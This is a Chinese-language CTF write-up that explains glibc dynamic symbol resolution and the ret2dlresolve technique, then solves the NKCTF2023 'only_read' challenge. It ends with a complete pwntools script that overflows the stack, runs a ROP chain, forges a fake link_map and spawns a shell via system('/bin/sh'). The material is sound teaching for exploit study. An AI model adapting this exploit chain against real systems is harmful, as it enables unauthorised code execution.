# EX2B: ret2dlresolve

## 1. 原理介绍

### 1.1 dlresolve过程

理解过程用到了如下程序

```c
1 #include <stdio.h>
2 // gcc -m32 -fno-stack-protector -no-pie -z relro -o demo.c -o demo
3 int main()
4 {
5     char data[20];
6     read(0,data,20);
7     return 0;
8 }
```

程序运行到call  read@plt单步进入

```assembly
1  ► 0x80491c3 <main+45>    call   read@plt                     <read@plt>
2         fd: 0x0 (/dev/pts/0)
3         buf: 0xffffd18c —▸ 0x8049233 (__libc_csu_init+83) ◂— add    esi, 1
4         nbytes: 0x14
```

查看read的plt表的内容

```assembly
1 pwndbg> x/5i 0x8049060
2 => 0x8049060 <read@plt>:    endbr32 
3    0x8049064 <read@plt+4>:    jmp    DWORD PTR ds:0x804c00c
4    0x804906a <read@plt+10>:    nop    WORD PTR [eax+eax*1+0x0]
5    0x8049070 <__libc_start_main@plt>:    endbr32 
6    0x8049074 <__libc_start_main@plt+4>:    jmp    DWORD PTR ds:0x804c010
```

可以看到程序跳进了0x804c00c所存储的地址里

```assembly
1 pwndbg> x/xw 0x804c00c
2 　　0x804c00c <read@got.plt>:    0x08049040
```

而0x804c00c正是read的got表，表里存放的地址是0x8049040在read的plt表的上面几个，我们看一下

```assembly
1 pwndbg> x/3i 0x8049040
2    0x8049040:    endbr32 
3    0x8049044:    push   0x0
4    0x8049049:    jmp    0x8049030
```

这里的代码会先将0压入栈里，再跳转到0x8049030的位置执行，我们看一下

```assembly
1  0x8049030                  push   dword ptr [_GLOBAL_OFFSET_TABLE_+4] <0x804c004>
2  ► 0x8049036                jmp    dword ptr [0x804c008]         <0xf7fe7b10>
```

发现他将0x804c004存储的值先压入栈中，再跳转到0x804c008所存储的地址即 0xf7fe7b10 执行

```assembly
1 0xf7feed90 <_dl_runtime_resolve>       push   eax
2 0xf7feed91 <_dl_runtime_resolve+1>     push   ecx
3 0xf7feed92 <_dl_runtime_resolve+2>     push   edx
4 0xf7feed93 <_dl_runtime_resolve+3>     mov    edx, dword ptr [esp + 0x10]
5 0xf7feed97 <_dl_runtime_resolve+7>     mov    eax, dword ptr [esp + 0xc]
6 0xf7feed9b <_dl_runtime_resolve+11>    call   _dl_fixup <0xf7fe85a0>
```

发现在进行了一系列的操作后，会进入0xf7fe85a0即_dl_fixup函数。

在跟进_dl_fixup前，了解一下动态链接相关的数据结构。

我们先查看一下demo的dynamic的信息：

```assembly
 1 $ readelf -d demo
 2 
 3 Dynamic section at offset 0x2f14 contains 24 entries:
 4   标记        类型                         名称/值
 5  0x00000001 (NEEDED)                     共享库：[libc.so.6]
 6  0x0000000c (INIT)                       0x8049000
 7  0x0000000d (FINI)                       0x804925c
 8  0x00000019 (INIT_ARRAY)                 0x804bf0c
 9  0x0000001b (INIT_ARRAYSZ)               4 (bytes)
10  0x0000001a (FINI_ARRAY)                 0x804bf10
11  0x0000001c (FINI_ARRAYSZ)               4 (bytes)
12  0x6ffffef5 (GNU_HASH)                   0x8048228
13  0x00000005 (STRTAB)                     0x8048298
14  0x00000006 (SYMTAB)                     0x8048248
15  0x0000000a (STRSZ)                      74 (bytes)
16  0x0000000b (SYMENT)                     16 (bytes)
17  0x00000015 (DEBUG)                      0x0
18  0x00000003 (PLTGOT)                     0x804c000
19  0x00000002 (PLTRELSZ)                   16 (bytes)
20  0x00000014 (PLTREL)                     REL
21  0x00000017 (JMPREL)                     0x8048314
22  0x00000011 (REL)                        0x804830c
23  0x00000012 (RELSZ)                      8 (bytes)
24  0x00000013 (RELENT)                     8 (bytes)
25  0x6ffffffe (VERNEED)                    0x80482ec
26  0x6fffffff (VERNEEDNUM)                 1
27  0x6ffffff0 (VERSYM)                     0x80482e2
28  0x00000000 (NULL)                       0x0
```

`Elf32_Dyn`是一个结构体数组，结构体的定义为：

```c
1 typedef struct {
2     Elf32_Sword     d_tag;
3     union {
4         Elf32_Word  d_val;
5         Elf32_Addr  d_ptr;
6     } d_un;
7 } Elf32_Dyn;
8 extern Elf32_Dyn_DYNAMIC[];
```

`Elf32_Dyn`结构由一个类型值加上一个附加的数值或指针，对于不同的类型，后面附加的数值或者指针有着不同的含义。下面给出和延迟绑定相关的类型值的定义。

[![img](https://img2020.cnblogs.com/blog/2684101/202112/2684101-20211217123615600-1979707640.png)](https://img2020.cnblogs.com/blog/2684101/202112/2684101-20211217123615600-1979707640.png)

由dynamic信息可知.rel.plt的地址为 0x8048314，.dynsym的地址为 0x8048248， .dynstr的地址为 0x8048298。

.rel.plt重定位表中包含了需要重定位函数的信息，也是一个结构体数组，结构体`Elf32_Rel`定义如下：

```
1 typedef struct {
2     Elf32_Addr        r_offset;
3     Elf32_Word       r_info;
4 } Elf32_Rel;
```

其中r_offset表示got表的地址，即真实函数地址所需填进的地方，r_info有两个作用，r_info>>8表示该函数对应在符号表.dynsym中的下标，r_info&0xff则表示重定位的类型。查看此程序的重定位表

```assembly
 1 $ readelf -r demo
 2 
 3 重定位节 '.rel.dyn' at offset 0x30c contains 1 entry:
 4  偏移量     信息    类型              符号值      符号名称
 5 0804bffc  00000206 R_386_GLOB_DAT    00000000   __gmon_start__
 6 
 7 重定位节 '.rel.plt' at offset 0x314 contains 2 entries:
 8  偏移量     信息    类型              符号值      符号名称
 9 0804c00c  00000107 R_386_JUMP_SLOT   00000000   read@GLIBC_2.0
10 0804c010  00000307 R_386_JUMP_SLOT   00000000   __libc_start_main@GLIBC_2.0
```

```assembly
1 pwndbg> x/8xw 0x8048314
2 0x8048314:    0x0804c00c    0x00000107    0x0804c010    0x00000307
3 0x8048324:    0x00000000    0x00000000    0x00000000    0x00000000
```

可以看到重定位表`.rel.plt`为一个`Elf32_Rel`数组，demo程序中该数组包含两个元素，第一个是`read`的重定位表项`Elf32_Rel`结构体，第二个是`__libc_start_main`。

`read`的重定位表`r_offset`为`0x0804c00c`，为`read`的got地址，即在动态解析函数完成后，将read的函数地址填入到`r_offset`为`0x0804c00c`中。

`r_info`为`0x00000107`表示read函数的符号表为`.dynsym`数组中的`0x00000107>>8`（即`0x1`）个元素，它的类型为`0x00000107&0xff`（即0x7）对应为`R_386_JUMP_SLOT`类型。

下面看动态链接符号表.dynsym

```assembly
1 $ readelf -s demo
2 
3 Symbol table '.dynsym' contains 5 entries:
4    Num:    Value  Size Type    Bind   Vis      Ndx Name
5      0: 00000000     0 NOTYPE  LOCAL  DEFAULT  UND 
6      1: 00000000     0 FUNC    GLOBAL DEFAULT  UND read@GLIBC_2.0 (2)
7      2: 00000000     0 NOTYPE  WEAK   DEFAULT  UND __gmon_start__
8      3: 00000000     0 FUNC    GLOBAL DEFAULT  UND __libc_start_main@GLIBC_2.0 (2)
9      4: 0804a004     4 OBJECT  GLOBAL DEFAULT   17 _IO_stdin_used
```

```assembly
1 pwndbg> x/20xw 0x8048248
2 0x8048248:    0x00000000    0x00000000    0x00000000    0x00000000
3 0x8048258:    0x0000001a    0x00000000    0x00000000    0x00000012
4 0x8048268:    0x0000003b    0x00000000    0x00000000    0x00000020
5 0x8048278:    0x0000001f    0x00000000    0x00000000    0x00000012
6 0x8048288:    0x0000000b    0x0804a004    0x00000004    0x00110011
```

从重定位表`.rel.plt`中，我们知道了read的`r_info>>8`为0x1，即read的符号表项对应的是`.dynsym`第二个元素，果然可以看到`.dynsym`第一个元素为read函数的`Elf32_Sym`结构体。

可以看到它的`st_name`对应的是`0x0000001a`，即`read`字符串应该在`.dynstr`表偏移为`0x1a`的地方.

由`dynamic`我们知道了`.dynstr`表的地址为地址为0x8048298，去验证下看其偏移`0x1a`是否为`read`字符串：

```assembly
1 pwndbg> x/s 0x8048298+0x1a
2 0x80482b2:    "read"
```

总结一下调用某个函数的过程如read：

1.第一次call read时会先跳转到read got表里存的地址，got表此时存放的事plt+6的地址，他会push一个参数（reloc_arg），然后跳转到公共表（plt0），公共表处会再push一个参数进去（link_map通过这个找dynamic段），然后就跳到 `_dl_runtime_resolve`函数。

2.`_dl_runtime_resolve`函数靠link_map先找到dynamic，再通过dynamic段找到 .rel.plt的地址为 0x8048314，.dynsym的地址为 0x8048248， .dynstr的地址为 0x8048298。

3.`_dl_runtime_resolve`函数靠reloc_arg在.rel.plt里找到read的r_offset和r_info。

4.r_info>>8用来在 .dynsym找到read对应的st_name ,r_info&0xff用来做检查。

5.st_name用来在.dynstr里找到read所对应的字符串

6.最后调用函数解析匹配read字符串所对应的函数地址，并将其填到r_offset（read的got表）里。

### 1.2 伪造linkmap

```c
_dl_fixup (struct link_map *l, ElfW(Word) reloc_arg) // 第一个参数link_map，也就是got[1]
{
    // 获取link_map中存放DT_SYMTAB的地址
  const ElfW(Sym) *const symtab = (const void *) D_PTR (l, l_info[DT_SYMTAB]);
    // 获取link_map中存放DT_STRTAB的地址
  const char *strtab = (const void *) D_PTR (l, l_info[DT_STRTAB]);
    // reloc_offset就是reloc_arg,获取重定位表项中对应函数的结构体
  const PLTREL *const reloc = (const void *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset);
    // 根据重定位结构体的r_info得到symtab表中对应的结构体
  const ElfW(Sym) *sym = &symtab[ELFW(R_SYM) (reloc->r_info)];
 
  void *const rel_addr = (void *)(l->l_addr + reloc->r_offset);
  lookup_t result;
  DL_FIXUP_VALUE_TYPE value;
 
  /* Sanity check that we're really looking at a PLT relocation.  */
  assert (ELFW(R_TYPE)(reloc->r_info) == ELF_MACHINE_JMP_SLOT); // 检查r_info的最低位是不是7
 
   /* Look up the target symbol.  If the normal lookup rules are not
      used don't look in the global scope.  */
  if (__builtin_expect (ELFW(ST_VISIBILITY) (sym->st_other), 0) == 0) // 这里是一层检测，检查sym结构体中的st_other是否为0，正常情况下为0，执行下面代码
    {
      const struct r_found_version *version = NULL;
    // 这里也是一层检测，检查link_map中的DT_VERSYM是否为NULL，正常情况下不为NULL，执行下面代码
      if (l->l_info[VERSYMIDX (DT_VERSYM)] != NULL)
    {
      // 到了这里就是64位下报错的位置，在计算版本号时，vernum[ELFW(R_SYM) (reloc->r_info)] & 0x7fff的过程中，由于我们一般伪造的symtab位于bss段，就导致在64位下reloc->r_info比较大,故程序会发生错误。所以要使程序不发生错误，自然想到的办法就是不执行这里的代码，分析上面的代码我们就可以得到两种手段，第一种手段就是使上一行的if不成立，也就是设置link_map中的DT_VERSYM为NULL，那我们就要泄露出link_map的地址，而如果我们能泄露地址，根本用不着ret2dlresolve。第二种手段就是使最外层的if不成立，也就是使sym结构体中的st_other不为0，直接跳到后面的else语句执行。
      const ElfW(Half) *vernum = (const void *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]);
      ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc->r_info)] & 0x7fff;
      version = &l->l_versions[ndx];
      if (version->hash == 0)
        version = NULL;
    }
 
      /* We need to keep the scope around so do some locking.  This is
     not necessary for objects which cannot be unloaded or when
     we are not using any threads (yet).  */
      int flags = DL_LOOKUP_ADD_DEPENDENCY;
      if (!RTLD_SINGLE_THREAD_P)
    {
      THREAD_GSCOPE_SET_FLAG ();
      flags |= DL_LOOKUP_GSCOPE_LOCK;
    }
 
      RTLD_ENABLE_FOREIGN_CALL;
    // 在32位情况下，上面代码运行中不会出错，就会走到这里，这里通过strtab+sym->st_name找到符号表字符串，result为libc基地址
      result = _dl_lookup_symbol_x (strtab + sym->st_name, l, &sym, l->l_scope,
                    version, ELF_RTYPE_CLASS_PLT, flags, NULL);
 
      /* We are done with the global scope.  */
      if (!RTLD_SINGLE_THREAD_P)
    THREAD_GSCOPE_RESET_FLAG ();
 
      RTLD_FINALIZE_FOREIGN_CALL;
 
      /* Currently result contains the base load address (or link map)
     of the object that defines sym.  Now add in the symbol
     offset.  */
      // 同样，如果正常执行，接下来会来到这里，得到value的值，为libc基址加上要解析函数的偏移地址，也即实际地址，即result+st_value
      value = DL_FIXUP_MAKE_VALUE (result, sym ? (LOOKUP_VALUE_ADDRESS (result) + sym->st_value) : 0);
    }
  else
    {
      // 这里就是64位下利用的关键，在最上面的if不成立后，就会来到这里,这里value的计算方式是 l->l_addr + st_value,我们的目的是使value为我们所需要的函数的地址，所以就得控制两个参数，l_addr 和 st_value
      /* We already found the symbol.  The module (and therefore its load
     address) is also known.  */
      value = DL_FIXUP_MAKE_VALUE (l, l->l_addr + sym->st_value);
      result = l;
    }
 
  /* And now perhaps the relocation addend.  */
  value = elf_machine_plt_value (l, reloc, value);
 
  if (sym != NULL
      && __builtin_expect (ELFW(ST_TYPE) (sym->st_info) == STT_GNU_IFUNC, 0))
    value = elf_ifunc_invoke (DL_FIXUP_VALUE_ADDR (value));
 
  /* Finally, fix up the plt itself.  */
  if (__glibc_unlikely (GLRO(dl_bind_not)))
    return value;
  // 最后把value写入相应的GOT表条目中
  return elf_machine_fixup_plt (l, result, reloc, rel_addr, value);
}
```

所以接下来我们的任务就是控制 **link_map** 中的**l_addr**和 **sym**中的**st_value**

具体思路为

- 伪造 link_map->l_addr 为libc中已解析函数与想要执行的目标函数的偏移值，如 addr_system-addr_xxx
- 伪造 sym->st_value 为已经解析过的某个函数的 got 表的位置
- 也就是相当于 value = l_addr + st_value = addr_system - addr_xxx + real_xxx = real_system

下面是64位下的sym结构体

```c
typedef struct 
{ 
  Elf64_Word    st_name;        /* Symbol name (string tbl index) */ 
  unsigned char st_info;        /* Symbol type and binding */ 
  unsigned char st_other;       /* Symbol visibility */ 
  Elf64_Section st_shndx;       /* Section index */ 
  Elf64_Addr    st_value;       /* Symbol value */ 
  Elf64_Xword   st_size;        /* Symbol size */ 
} Elf64_Sym;
```

其中

- Elf64_Word 32 位
- Elf64_Section 16 位
- Elf64_Addr 64 位
- Elf64_Xword 64 位

所以sym结构体的大小为24字节，st_value就位于sym[num]首地址+0x8的位置（ 4 + 1 + 1 + 2）

我们自然就可以想到，如果，我们把一个函数的got表地址-0x8的位置当作sym表首地址，那么它的st_value的值就是这个函数的got表上的值，也就是实际地址，此时它的st_other恰好不为0

再来看link_map的结构

```c
struct link_map {
    Elf64_Addr l_addr;
    char *l_name;
    Elf64_Dyn *l_ld;
    struct link_map *l_next;
    struct link_map *l_prev;
    struct link_map *l_real;
    Lmid_t l_ns;
    struct libname_list *l_libname;
    Elf64_Dyn *l_info[76];  //l_info 里面包含的就是动态链接的各个表的信息
    ...
    size_t l_tls_firstbyte_offset;
    ptrdiff_t l_tls_offset;
    size_t l_tls_modid;
    size_t l_tls_dtor_count;
    Elf64_Addr l_relro_addr;
    size_t l_relro_size;
    unsigned long long l_serial;
    struct auditstate l_audit[];
}
```

这里的.dynamic节就对应l_info的内容

![image-20210310011345625](https://bbs.kanxue.com/upload/attach/202104/921840_9CS92EZC2PWB3VF.jpg)

所以如果我们伪造一个link_map表，很容易就可以控制 l_addr ，通过阅读源码，我们知道_dl_fixup主要用了 **l_info** 的内容 ，也就是其中JMPREL,STRTAB,SYMTAB的地址。

所以我们需要伪造这个数组里的几个指针

- DT_STRTAB指针：位于link_map_addr +0x68
- DT_SYMTAB指针：位于link_map_addr + 0x70
- DT_JMPREL指针：位于link_map_addr +0xF8

然后伪造三个elf64_dyn即可，dynstr只需要指向一个可读的地方，因为这里我们没有用到

```c
typedef struct
{
  Elf64_Addr        r_offset;                /* Address */
  Elf64_Xword        r_info;                        /* Relocation type and symbol index */
  Elf64_Sxword        r_addend;                /* Addend */
} Elf64_Rela;
/* How to extract and insert information held in the r_info field.  */
#define ELF64_R_SYM(i)                        ((i) >> 32)
#define ELF64_R_TYPE(i)                        ((i) & 0xffffffff)
#define ELF64_R_INFO(sym,type)                ((((Elf64_Xword) (sym)) << 32) + (type))
```

这里 Elf64_Addr、Elf64_Xword、Elf64_Sxword 都为 64 位，因此 Elf64_Rela 结构体的大小为 24 （0x18）字节。

![image-20210309200557598](https://bbs.kanxue.com/upload/attach/202104/921840_Q6YK9KE5V7N4HG6.jpg)

在这里可以看到，write 函数在符号表中的偏移为 1（0x100000007h>>32）

除此之外，在 64 位下，plt 中的代码 push 的是待解析符号在重定位表中的索引，而不是偏移。比如，write 函数 push 的是 0，对应上图第一个位置

![image-20210310003453921](https://bbs.kanxue.com/upload/attach/202104/921840_DZJ6R6PGADNXDQ2.jpg)

 接下来我们伪造link_map，know_func_ptr为已解析函数的got表地址，offset为system函数与这个函数在libc上的偏移，由于我们只需要在link_map特定的几个位置伪造指针，而中间的内容不会用到。

## 2. 例题

题目选自NKCTF2023中的only_read，这道题是一个典型的ret2dlresolve，题目代码如下：

```c
ssize_t next()
{
  char buf[48]; // [rsp+0h] [rbp-30h] BYREF

  return read(0, buf, 0x200uLL);
}

int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s1[64]; // [rsp+0h] [rbp-80h] BYREF
  char s[64]; // [rsp+40h] [rbp-40h] BYREF

  setbuf(stdin, 0LL);
  setbuf(stdout, 0LL);
  setbuf(stderr, 0LL);
  memset(s, 0, sizeof(s));
  memset(s1, 0, sizeof(s1));
  read(0, s, 0x30uLL);
  base_decode(s, s1);
  if ( strcmp(s1, "Welcome to NKCTF!") )
    return 0;
  memset(s, 0, sizeof(s));
  memset(s1, 0, sizeof(s1));
  read(0, s, 0x30uLL);
  base_decode(s, s1);
  if ( strcmp(s1, "tell you a secret:") )
    return 0;
  memset(s, 0, sizeof(s));
  memset(s1, 0, sizeof(s1));
  read(0, s, 0x40uLL);
  base_decode(s, s1);
  if ( strcmp(s1, "I'M RUNNING ON GLIBC 2.31-0ubuntu9.9") )
    return 0;
  memset(s, 0, sizeof(s));
  memset(s1, 0, sizeof(s1));
  read(0, s, 0x40uLL);
  base_decode(s, s1);
  if ( !strcmp(s1, "can you find me?") )
    next();
  return 0;
}
```

题目逻辑很简单，在输入四个base64编码的字符串后，存在一个可以栈溢出0x1D0的漏洞，程序开启保护如下：

![image-20230423195527501](C:\Users\w1z4rd\AppData\Roaming\Typora\typora-user-images\image-20230423195527501.png)

接下来按照上述原理利用该题目 ，注释写的很详细

```python
from pwn import *
p=process('./pwn')
context(arch='amd64',os='linux',log_level='debug')
#r=gdb.debug('./pwn')#,'b *0x4013e1')
elf=ELF('./pwn')
libc=ELF('/home/w1z4rd/CTF/tools/glibc-all-in-one/libs/2.31-0ubuntu9.9_amd64/libc-2.31.so')

def debug():
    context.terminal=['gnome-terminal','sh','-x']
    gdb.attach(r)
    pause()

p.send('V2VsY29tZSB0byBOS0NURiE=')
sleep(0.5)
p.send('dGVsbCB5b3UgYSBzZWNyZXQ6')
sleep(0.5)
p.send('SSdNIFJVTk5JTkcgT04gR0xJQkMgMi4zMS0wdWJ1bnR1OS45')
sleep(0.5)
p.send('Y2FuIHlvdSBmaW5kIG1lPw==')
sleep(0.5)
fun_addr = 0x4013c4
read_plt=elf.plt['read']
read_got=elf.got['read']
bss = 0x0000000000404060
l_addr = libc.sym['system'] - libc.sym['read'] #选取read函数为目标函数，计算read函数与system的偏移
r_offset=bss+l_addr *-1
if l_addr<0: #由于便宜通常为负值，这里我们将其改正
    l_addr=l_addr + 0x10000000000000000
pop_rdi = 0x0000000000401683
pop_rsi = 0x0000000000401681
plt_load= 0x0000000000401026 #完成linkmap构造后，使程序进入dlresolve函数的入口
payload=b'a'*0x38 +p64(pop_rsi) + p64(bss + 0x100) + p64(0) + p64(pop_rdi) +p64(0) +p64(read_plt) +p64(fun_addr) #将linkmap伪造在bss+0x100的地方，并再次返回到漏洞函数，以便进行第二次读入
sleep(0.1)
p.send(payload)
#开始伪造linkmap
dynstr =0x000000000000000000004004d8 #read_got地址，不重要，dynstr只要求可读即可
fake_link_map_addr=bss + 0x100 #伪造linkmap的地址
fake_dyn_strtab_addr = fake_link_map_addr + 0x8 #strtab的地址
fake_dyn_strtab= p64(0) + p64(dynstr) #构造strtab，在strtab中，第一个元素都是0，第二个元素就是dynstr
fake_dyn_symtab_addr = fake_link_map_addr + 0x18 #symtab的地址
fake_dyn_symtab=p64(0) + p64(read_got - 0x8) #symtab要求其中的st_other值为0，st_value为目标函数地址-8，st_other在前八个字节中，st_value是第二个八字节
fake_dyn_rel_addr = fake_link_map_addr + 0x28 #伪造dyn_rel的地址
fake_dyn_rel=p64(0)+p64(fake_link_map_addr+0x38) #dyn_rel第一个八字节是0，第二个八字节是rel.plt的地址
fake_rel=p64(r_offset) + p64(0x7) +p64(0) #即rel.plt的构造，Rela->r_offset,正常情况下这里应该存的是got表对应条目的地址，解析完成后在这个地址上存放函数的实际地址，此处我们只需要设置一个可读写的地址即可，7是r_info为了绕过函数的检查，0是填充
fake_link_map=p64(l_addr)#偏移
fake_link_map+= fake_dyn_strtab#strtab
fake_link_map+=fake_dyn_symtab#symtab
fake_link_map+= fake_dyn_rel#jmp_rel
fake_link_map+=fake_rel#rel
fake_link_map= fake_link_map.ljust(0x68,b'\x00')#偏移
fake_link_map+=p64(fake_dyn_strtab_addr)#在linkmap偏移0x68的地方存放strtab_addr
fake_link_map +=p64(fake_dyn_symtab_addr)#在linkmap偏移0x70的地方存放symtab_addr
fake_link_map += b'/bin/sh'.ljust(0x80,b'\x00')#填充，顺便放入"/bin/sh"字符串
fake_link_map +=p64(fake_dyn_rel_addr)#在linkmap偏移0xf8的地方存放jmp_rel_addr
sleep(1)
p.send(fake_link_map)#发送伪造的linkmap
sleep(1)
rop=b'A'*0x38+p64(pop_rdi) +p64(fake_link_map_addr +0x78) +p64(plt_load) +p64(fake_link_map_addr) +p64(0)#再次读入，在伪造linkmap+0x78的地方放入了/bin/sh字符串，现在将其弹入rdi中，之后调用dlresolve，由于函数特性，其两个参数均由栈来传递，后面再压入两个参数，即伪造的linkmap地址和reloc_arg（这是由我们构造的，为了方便一般构造为0）
p.send(rop)#发送构造好的payload即可触发dlreslove，将system函数作为read引用，参数为/bin/sh
p.interactive()
```

构造的linkmap框架图如下所示

![image-20230423205519858](C:\Users\w1z4rd\AppData\Roaming\Typora\typora-user-images\image-20230423205519858.png)